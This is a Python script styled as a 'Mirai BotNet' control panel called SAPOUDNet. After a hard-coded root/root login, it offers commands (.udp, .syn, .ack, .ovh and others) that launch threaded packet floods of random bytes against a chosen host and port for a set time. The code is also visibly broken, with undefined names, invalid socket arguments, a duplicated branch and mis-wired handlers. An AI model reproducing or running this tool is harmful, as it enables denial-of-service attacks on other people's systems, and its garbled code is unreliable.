#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os

sys.stdout.write("\x1b]2;\x1b[0;96m SAP\x1b[0;95mOUD\033[01;97m Welcome To SAPOUDNet\x07")
def modifications():
	print ("Contact H@ck3rB0y The Mirai Botnet Is Currently Under Maitnance.")
	on_enter = input("Press Enter To Leave.")
	exit()
#column:65
methods = """
\033[01;97m             -> |\x1b[0;96m Attack Methods\033[01;97m | <-   
\033[0;96m ╔════════════════════════════════════════════╗   \033[0m 
\033[0;96m ║ .icmp [\033[97mip\033[0;96m] [\033[97mport\033[0;96m] [\033[97mtime\033[0;96m]   [\033[97msize\033[0;96m]           ║  \033[0m
\033[0;96m ║ .std [\033[97mip\033[0;96m] [\033[97mport\033[0;96m] [\033[97mtime\033[0;96m]   [\033[97msize\033[0;96m]           ║  \033[0m
\033[0;96m ║ .udp [\033[97mip\033[0;96m] [\033[97mport\033[0;96m] [\033[97mtime\033[0;96m]   [\033[97msize\033[0;96m]           ║  \033[0m
\033[0;96m ║ .ovh [\033[97mip\033[0;96m] [\033[97mport\033[0;96m] [\033[97mtime\033[0;96m]   [\033[97msize\033[0;96m]           ║  \033[0m
\033[0;95m ║ .ack [\033[97mip\033[0;95m] [\033[97mport\033[0;95m] [\033[97mtime\033[0;95m]   [\033[97msize\033[0;95m]           ║  \033[0m
\033[0;95m ║ .syn [\033[97mip\033[0;95m] [\033[97mport\033[0;95m] [\033[97mtime\033[0;95m]   [\033[97msize\033[0;95m]           ║   \033[0m
\033[0;95m ║ .stdhex - Lag [\033[97mip\033[0;95m] [\033[97mport\033[0;95m] [\033[97mtime\033[0;95m]  [\033[97msize\033[0;95m]   ║    \033[0m
\033[0;95m ║ .udpplain - Lag [\033[97mip\033[0;95m] [\033[97mport\033[0;95m] [\033[97mtime\033[0;95m] [\033[97msize\033[0;95m]  ║     \033[0m
\033[0;95m ╚════════════════════════════════════════════╝   \033[0m
"""

info = """
\033[1;31m╔══════════════════════════════════════════════╗
\033[1;31m║ \033[97m       SAPOUDNet is mirai BotNet        \033[1;31m     ║
\033[1;31m║ \033[97m                 coded by               \033[1;31m     ║
\033[1;31m║ \033[97m                 H4ck3rB0y              \033[1;31m     ║
\033[1;31m║ \033[97m  Team SAPOUD                           \033[1;31m     ║
\033[1;31m╚══════════════════════════════════════════════╝
"""

help = """
\033[1;31m     \033[01;97m -> |  \x1b[0;95m Menu\033[0;97m  | <-    \033[0m
\033[0;96m ╔══════════════════════════════════════╗   \033[0m 
\033[0;96m ║ \x1b[0;96mMETHODS -> \033[97mShows attack commands     \033[0;96m║   \033[0m 
\033[0;96m ║ \x1b[0;96mINFO -> \033[97mShows owner info             \033[0;96m║   \033[0m 
\033[0;96m ║ \x1b[0;96mTOOLS -> \033[97mShows admin commands        \033[0;96m║   \033[0m 
\033[0;95m ║ \x1b[0;95mCLS -> \033[97mClears the terminal           \033[0;95m║   \033[0m 
\033[0;95m ║ \x1b[0;95mEXIT -> \033[97mExits from the terminal    \033[0;95m  ║   \033[0m 
\033[0;95m ╚══════════════════════════════════════╝ \033[0m 
"""

tools = """
\033[0;96m╔═══════════════════════════════════════════════╗
\033[0;96m║  \033[97mType .stop To Stop All Attacks.             \033[0;96m ║
\033[0;96m║  \033[97mType .attacks To See All Running Attacks.   \033[0;96m ║
\033[0;95m║  \033[97mType .resolve (HOST) o Resolve A Domains IP.\033[0;95m ║
\033[0;95m║  \033[97mType .ping (HOST) (port) To Ping A Host.    \033[0;95m ║
\033[0;95m╚═══════════════════════════════════════════════╝
"""

banner = """
\033[0;96m                 ╔═══════════════════════════════════════════════════════════════╗
\033[0;96m                 ║                      [+] SAPOUDNet! [+]                       ║    
\033[0;96m                 ║[+]=========================================================[+]║
\033[0;96m                 ║            This Mirai BotNet is create by H4ck3rB0y           ║
\033[0;96m                 ║═══════════════════════════════════════════════════════════════║
\033[0;96m                 ║          H4ck3rB0y           ║         [+] Rules! [+]         ║
\033[0;96m                 ║                              ║      (437 Device Conected)     ║
\033[0;96m                 ║   i have code this botnet    ║[+]==========================[+]║
\033[0;95m                 ║   to stop skid or script     ║     No Copy and shering        ║
\033[0;95m                 ║   kidie to ddos everyone     ║     No Attacking The Gov       ║
\033[0;95m                 ║                              ║        No Spamming             ║
\033[0;95m                 ║   Inspired By BoTneT Joker   ║     No Attacking Dstats        ║
\033[0;95m                 ║                              ║     No Ddosing the Net         ║
\033[0;95m                 ╚═══════════════════════════════════════════════════════════════╝
"""
  
                                          
 
                                                                                                 



af = """
\x1b[0;96m ███████╗ █████╗ ██████╗  ██████╗ ██╗   ██╗\x1b[0;95m██████╗ ███╗   ██╗███████╗████████╗
\x1b[0;96m ██╔════╝██╔══██╗██╔══██╗██╔═══██╗██║   ██║\x1b[0;95m██╔══██╗████╗  ██║██╔════╝╚══██╔══╝
\x1b[0;96m ███████╗███████║██████╔╝██║   ██║██║   ██║\x1b[0;95m██║  ██║██╔██╗ ██║█████╗     ██║   
\x1b[0;96m ╚════██║██╔══██║██╔═══╝ ██║   ██║██║   ██║\x1b[0;95m██║  ██║██║╚██╗██║██╔══╝     ██║   
\x1b[0;96m ███████║██║  ██║██║     ╚██████╔╝╚██████╔╝\x1b[0;95m██████╔╝██║ ╚████║███████╗   ██║   
\x1b[0;96m ╚══════╝╚═╝  ╚═╝╚═╝      ╚═════╝  ╚═════╝ \x1b[0;95m╚═════╝ ╚═╝  ╚═══╝╚══════╝   ╚═╝ 
\x1b[0;96m             We Smoke \033[0;92m all Weed 
\033[1;31m          \033[01;97m -> |  \x1b[0;95m Menu\033[0;97m  | <-    \033[0m
\033[0;96m ╔══════════════════════════════════════╗   \033[0m 
\033[0;96m ║ \x1b[0;96mMETHODS -> \033[97mShows attack commands     \033[0;96m║   \033[0m 
\033[0;96m ║ \x1b[0;96mINFO -> \033[97mShows owner info             \033[0;96m║   \033[0m 
\033[0;96m ║ \x1b[0;96mTOOLS -> \033[97mShows admin commands        \033[0;96m║   \033[0m 
\033[0;95m ║ \x1b[0;95mCLS -> \033[97mClears the terminal           \033[0;95m║   \033[0m 
\033[0;95m ║ \x1b[0;95mEXIT -> \033[97mExits from the terminal    \033[0;95m  ║   \033[0m 
\033[0;95m ╚══════════════════════════════════════╝ \033[0m 
"""
  

fsubs = 0
tpings = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
iaid = 0
haid = 0
aid = 0
attack = True
ack = True
udp = True
syn = True
ovh = True
stdhex = True
udpplain = True
http = True
icmp = True
std = True

def udpplainsender(host, dport, timer, punch):
	global iaid
	global udpplain
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and udpplain and attack:
		sock.sendto(punch, (host, int(dport)))
	iaid -= 1
	aid -= 1


def synsender(host, dport, timer, punch):
	global said
	global syn
	global aid
	global tattacks
	timeout = time.time() + float(timer)
	sock = socket.socket (socket.AF_INET, socket.SOCK_RAW, socketvse_synCNT)

	said += 1
	tattacks += 1
	aid += 1
	while time.time() < timeout and syn and attack:
		sock.sendto(punch, (host, int(dport)))
	said -= 1
	aid -= 1

def udpender(host, dport, timer, punch):
	global uaid
	global udp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and udp and attack:
		sock.sendto(punch, (host, int(dport)))
	uaid -= 1
	aid -= 1

def ovhsender(host, dport, timer, punch):
	global iaid
	global ovh
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and ovh/nfo and attack:
		sock.sendto(punch, (host, int(dport)))
	iaid -= 1
	aid -= 1

def stdhexsender(host, dport, timer, punch):
	global iaid
	global stdhex
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and stdhex and attack:
		sock.sendto(punch, (host, int(dport)))
	iaid -= 1
	aid -= 1

def acksender(host, dport, timer, punch):
	global haid
	global ack
	global aid
	global tattacks

	timeout = time.time() + float(timer)

	haid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and ovh and attack:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.sendto(punch, (host, int(dport)))
			sock.close()
		except socket.error:
			pass

	haid -= 1
	aid -= 1

def icmpsender(host, port, timer, punch):
	global iaid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		sock.sendto(punch, (host, int(port)))
	iaid -= 1
	aid -= 1

def stdsender(host, port, timer, punch):
	global iaid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		sock.sendto(punch, (host, int(port)))
	iaid -= 1
	aid -= 1

def httpsender(host, port, timer, punch):
	global haid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		sock.sendto(punch, (host, int(port)))
	haid -= 1
	aid -= 1


def main():
	global fsubs
	global tpings
	global liips
	global tattacks
	global uaid
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp
	global syn
	global ovh
	global ack
	global std
	global udpplain
	global udp

	while True:
		sys.stdout.write("")
		sin = input("(\033[0;96mSAP\033[0;95mOUD\033[01;97m)=").lower()
		sinput = sin.split(" ")[0]
		if sinput == "cls":
			os.system ("clear")
			print (af)
			main()
		elif sinput == "help":
			print (help)
			main()
		elif sinput == "exit":
			exit()
		elif sinput == "methods":
			print (methods)
			main()
		elif sinput == "tools":
			print (tools)
			main()
		elif sinput == "info":
			print (info)
			main()
		elif sinput == ".attacks":
			print ("\n[\033[96mSAPOUD\033[00m] UPD Running processes: {}".format (uaid))
			print ("[\033[96mSAPOUD\033[00m] SYN Running processes: {}".format (said))
			print ("[\033[95mSAPOUD\033[00m] STD Running Processes: {}".format (said))
			print ("\n[\x1b[0;96mSA\x1b[0;95mPOUD\033[01;97m] Total .Attacks: {}\n".format (aid))
			main()
		elif sinput == ".resolve":
			liips += 1
			host = sin.split(" ")[1]
			host_ip = socket.gethostbyname(host)
			print ("[\x1b[0;96m SAP\x1b[0;95mOUD\033[01;97m] Host: {} \033[00m[Converted] {}".format (host, host_ip))
			main()
		elif sinput == ".ping":
			tpings += 1
			try:
				sinput, host, dport = sin.split(" ")
				print ("[\x1b[0;96m SAP\x1b[0;95mOUD\033[01;97m] Starting Ping On Host: {}".format (host))
				try:
					ip = socket.gethostbyname(host)
				except socket.gaierror:
					print ("[\x1b[0;96m SAP\x1b[0;95mOUD\033[01;97m] Host Un-Resolvable.")
					main()
				while True:
					try:
						sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						sock.settimeout(2)
						start = time.time() * 1000
						sock.connect ((host, int(dport)))
						stop = int(time.time() * 1000 - start)
						sys.stdout.write("\x1b]2;E L A [()ms] \x1b[0;96m SAP\x1b[0;92mPOUD\x07".format (stop))
						print ("\x1b[0;96m Wai\x1b[0;95mting\033[01;35m IP:{}:{} | Time: {}ms [Online]".format(ip, dport, stop))
						sock.close()
						time.sleep(1)
					except socket.error:
						sys.stdout.write("\x1b]2;E L A |TIME OUT| \x1b[0;95m SAP\x1b[0;92mOUD\x07")
						print ("\x1b[0;96m Wai\x1b[0;95mting \033[01;31m IP:{} | Time:{}ms [Offline]".format(ip, dport))
						time.sleep(1)
					except KeyboardInterrupt:
						print("")
						main()
			except ValueError:
				print ("[\x1b[0;96m SAP\x1b[0;95mOUD\033[01;97m] The Command {} Requires An Argument.".format (sinput))
				main()
		elif sinput == ".udp":
			if username == "guests":
				print ("[\x1b[0;96m SAP\x1b[0;95mOUD\033[01;97m v2] You Are Not Allowed To Use This Method.")
				main()
			else:
				try:
					sinput, host, dport, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("Attack Sent 🚀: {}\n".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=udpender, args=(host, dport, timer, punch)).start()
				except ValueError:
					print ("[\x1b[0;96m SAP\x1b[0;95mOUD\033[01;97m v2] The Command {} Requires An Argument.".format (sinput))
					main()
				except socket.gaierror:
					print ("[\x1b[0;96m SAP\x1b[0;95mOUD\033[01;97m v2] Host: {} Invalid".format (host))
					main()
		elif sinput == ".ack":
			try:    
				sinput, host, dport, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("Attack Sent 🚀: {}\n".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=stdhexsender, args=(host, dport, timer, punch)).start()
			except ValueError:
				print ("[\x1b[0;96m SAP\x1b[0;95mOUD\033[01;97m] The Command {} Requires An Argument.".format (sinput))
				main()
			except socket.gaierror:
				print ("[\x1b[0;96m SAP\x1b[0;95mOUD\033[01;97m] Host: {} Invalid".format (host))
				main()
		elif sinput == ".ovh":
			if username == "guests":
				print ("[\x1b[0;96m SAP\x1b[0;95mPOUD\033[01;97m] You Are Not Allowed To Use This Method.")
				main()
			try:    
				sinput, host, dport, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("Attack Sent 🚀: {}\n".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=stdhexsender, args=(host, dport, timer, punch)).start()
			except ValueError:
				print ("[\x1b[0;96m SAP\x1b[0;95mPOUD\033[01;97m] The Command {} Requires An Argument.".format (sinput))
				main()
			except socket.gaierror:
				print ("[\x1b[0;96m SAP\x1b[0;95mOUD\033[01;97m] Host: {} Invalid".format (host))
				main()
		elif sinput == ".ovh":
			if username == "guests":
				print ("[\x1b[0;96m SAP\x1b[0;95mOUD\033[01;97m] You Are Not Allowed To Use This Method.")
				main()
			try:
				sinput, host, dport, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("Attack Sent 🚀: {}\n".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=stdhexsender, args=(host, dport, timer, punch)).start()
			except ValueError:
				print ("[\x1b[0;96m SAP\x1b[0;95mOUD\033[01;97m] The Command {} Requires An Argument.".format (sinput))
				main()
			except socket.gaierror:
				print ("[\x1b[0;96m SAP\x1b[0;95mOUD\033[01;97m] Host: {} Invalid".format (host))
				main()
		elif sinput == ".udpplain":
			if username == "guests":
				print ("[\x1b[0;96m SAP\x1b[0;95mOUD\033[01;97m] You Are Not Allowed To Use This Method.")
				main()
			else:
				try:
					sinput, host, dport, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("Attack Sent 🚀: {}\n".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=ovhsender, args=(host, dport, timer, punch)).start()
				except ValueError:
					print ("[\x1b[0;96m SAP\x1b[0;95mOUD\033[01;97m] The Command {} Requires An Argument.".format (sinput))
					main()
				except socket.gaierror:
					print ("[\x1b[0;96m SAP\x1b[0;95mOUD\033[01;97m] Host: {} Invalid".format (host))
					main()
		elif sinput == ".syn":
			try:
				sinput, host, dport, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print (" Attack Sent 🚀: {}\n".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=synsender, args=(host, dport, timer, punch)).start()
			except ValueError:
				print ("[\x1b[0;96m SAP\x1b[0;95mOUD\033[01;97m] The Command {} Requires An Argument.".format (sinput))
				main()
			except socket.gaierror:
				print ("[\x1b[0;96m SAP\x1b[0;95mOUD\033[01;97m] Host: {} Invalid".format (host))
				main()
		elif sinput == ".std":
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print (" Attack Sent 🚀: {}\n".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=stdsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("[\x1b[0;96m SAP\x1b[0;95mOUD\033[01;97m] The Command {} Requires An Argument.".format (sinput))
				main()
			except socket.gaierror:
				print ("[\x1b[0;96m SAP\x1b[0;95mOUD\033[01;97m] Host: {} Invalid".format (host))
				main()
		elif sinput == ".icmp":
			if username == "guests":
				print ("[\x1b[0;96m SAP\x1b[0;95mOUD\033[01;97m] You are not allowed to use this method")
				main()
			else:
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print (" Attack Sent 🚀: {}\n".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("[\033[91mSIN\033[00m] The command {} requires an argument".format (sinput))
					main()
				except socket.gaierror:
					print ("[\033[91mSIN\033[00m] Host: {} invalid".format (host))
					main()
		elif sinput == ".stop":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			what = sin.split(" ")[1]
			if what == "udp":
				print ("Stoping All udp Attacks.")
				udp = False
				while not udp:
					if aid == 0:
						print ("[\x1b[0;96m SAP\x1b[0;95mOUD\033[01;97m] No udp Processes Running.")
						udp = True
			if what == "ovh":
				print ("Stopping all ovh attacks")
				ovh = False
				while not ovh:
                      
					print ("[\x1b[0;96m SAP\x1b[0;95mOUD\033[01;97m] No ovh Processes Running.")
					udp = True
					main()
		else:
			print ("[\x1b[0;96m SAP\x1b[0;95mOUD\033[01;97m] {} Is Not A Command.".format(sinput))
			main()
                        



			main()
			

try:
	users = ["root", "root"]
	clear = "clear"
	os.system (clear)
	username = getpass.getpass ("[\x1b[0;96mUser\x1b[0;95mname\033[01;97m] ")
	if username in users:
		user = username
	else:
		print ("[*] Incorrect, Exiting.")
		exit()
except KeyboardInterrupt:
	print ("\nCtrl-C Has Been Pressed.")
	exit()
try:
	passwords = ["root", "root"]
	password = getpass.getpass ("[\x1b[0;96mPass\x1b[0;95mword\033[01;97m] ")
	if user == "root":
		if password == passwords[0]:
			print ("[*] Login Correct.")
			print ("[*] Type help To See Commands.")
			time.sleep(2)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[anime] Ctrl-C Has Been Pressed.")
				main()
		else:
			print ("[*] Incorrect, Exiting.")
			exit()
	if user == "root":
		if password == passwords[1]:
			print ("[*] Login Correct.")
			print ("[*] Certain Methods Will Not Be Available To You.")
			print ("[*] Type help To See Commands.")
			time.sleep(5)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[anime] Ctrl-C Has Been Pressed.")
				main()
		else:
			print ("[*] Incorrect, Exiting.")
			exit()
except KeyboardInterrupt:
	exit()